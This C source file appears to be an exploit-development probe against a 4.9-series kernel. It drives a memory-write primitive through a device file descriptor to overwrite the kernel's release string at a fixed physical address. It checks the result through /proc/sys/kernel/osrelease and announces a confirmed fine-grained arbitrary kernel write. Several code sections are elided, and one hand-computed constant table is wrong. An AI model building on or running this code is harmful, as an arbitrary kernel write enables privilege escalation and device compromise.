/*
 * kort_probe5.c - WB 落点精确 characterization (osrelease 探针)
 *
 * init_uts_ns @ PA 0x027CDD38, release("4.9.269-ab4536") @ 页偏移 0xD8A
 * /proc/sys/kernel/osrelease 全文可见 (15 字节)
 *
 * 测试矩阵 (BIND PA 0x027CD000):
 *   W1: H=0x20 @ +0xD80 (0x80 对齐) -> osrelease 哪里变?
 *   W2: H=0x20 @ +0xD8A (精确)     -> ?
 *   W3: H=4    @ +0xD8A            -> H=4 在 BIND 页是否生效?
 *   W4: 细粒度 @ +0xD8A=CCCC, +0xD8E=DDDD (升序 H=0x20)
 *   W5: H=0x20 @ +0xD40 (跨字段)   -> 对齐粒度判定
 * 同时全文打印 /proc/version 复核 probe4 的盲区
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
...
int main(void) {
    ...
    printf("[*] kort_probe5 - exact landing characterization via osrelease\n");
    ...
    char o[64];
    read_file("/proc/sys/kernel/osrelease", o, sizeof(o));
    printf("[*] osrelease : '%s' (release field @ page+0xD8A)\n", o);
    ...
    /* W1: H=0x20 @ +0xD80 (0x80 对齐) */
    printf("\n[W1] H=0x20 @ +0xD80 val=////\n");
    wb_write_wh(fd, (uint32_t*)buf, VA + 0xD80, 0x2F2F2F2F, 0x10, 0x20);
    flush_cpu_cache();
    read_file("/proc/sys/kernel/osrelease", o, sizeof(o));
    printf("  osrelease: '%s'\n", o);

    /* 恢复 release 原值: "4.9.269-ab4536" 5 dwords 升序 */
    {
        static const uint32_t dw[5] = {
            0x2e342e34, 0x2d393632, 0x36353462, 0 /* 0x00 '6'0 */
        };
        /* 手工算: "4.9." = 0x34 0x2e 0x39 0x2e -> LE 0x2e392e34 */
        /* 用字符数组更稳妥 */
        static const char rel[] = "4.9.269-ab4536";
        for (int i = 0; i < 4; i++) {
            uint32_t d;
            memcpy(&d, rel + 4*i, 4);
            wb_write_wh(fd, (uint32_t*)buf, VA + 0xD8A + 4*i, d, 0x10, 0x20);
        }
        flush_cpu_cache();
        read_file("/proc/sys/kernel/osrelease", o, sizeof(o));
        printf("  restored: '%s'\n", o);
    ...
    /* W2: H=0x20 @ +0xD8A (精确偏移) */
    printf("\n[W2] H=0x20 @ +0xD8A val=AAAA\n");
    wb_write_wh(fd, (uint32_t*)buf, VA + 0xD8A, 0x41414141, 0x10, 0x20);
    flush_cpu_cache();
    read_file("/proc/sys/kernel/osrelease", o, sizeof(o));
    printf("  osrelease: '%s'\n", o);
    ...
    /* W3: H=4 @ +0xD8A */
    printf("\n[W3] H=4 @ +0xD8A val=BBBB\n");
    wb_write_wh(fd, (uint32_t*)buf, VA + 0xD8A, 0x42424242, 0x10, 0x4);
    flush_cpu_cache();
    read_file("/proc/sys/kernel/osrelease", o, sizeof(o));
    printf("  osrelease: '%s'\n", o);
    ...
    /* W4: 细粒度升序 +0xD8A=CCCC, +0xD8E=DDDD */
    printf("\n[W4] fine-grain: +0xD8A=CCCC then +0xD8E=DDDD (H=0x20)\n");
    wb_write_wh(fd, (uint32_t*)buf, VA + 0xD8A, 0x43434343, 0x10, 0x20);
    wb_write_wh(fd, (uint32_t*)buf, VA + 0xD8E, 0x44444444, 0x10, 0x20);
    flush_cpu_cache();
    read_file("/proc/sys/kernel/osrelease", o, sizeof(o));
    printf("  osrelease: '%s'\n", o);
    if (strncmp(o, "CCCCDDDD", 8) == 0)
        printf("  [+] *** FINE-GRAINED ARBITRARY WRITE CONFIRMED ***\n");
